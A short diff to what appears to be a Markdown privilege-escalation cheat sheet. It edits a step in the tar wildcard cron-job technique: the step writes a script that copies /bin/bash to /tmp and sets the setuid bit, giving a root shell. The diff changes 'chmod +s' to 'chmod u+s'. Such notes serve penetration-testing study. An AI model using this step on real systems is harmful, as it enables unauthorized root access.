@@ -18,7 +18,7 @@
 
 ### If a cronjob contains a wildcard utilizing tar we can do:
 
-#### 1) echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
+#### 1) echo 'cp /bin/bash /tmp/bash; chmod u+s /tmp/bash' > runme.sh
 
 #### 2) chmod +x runme.sh
 
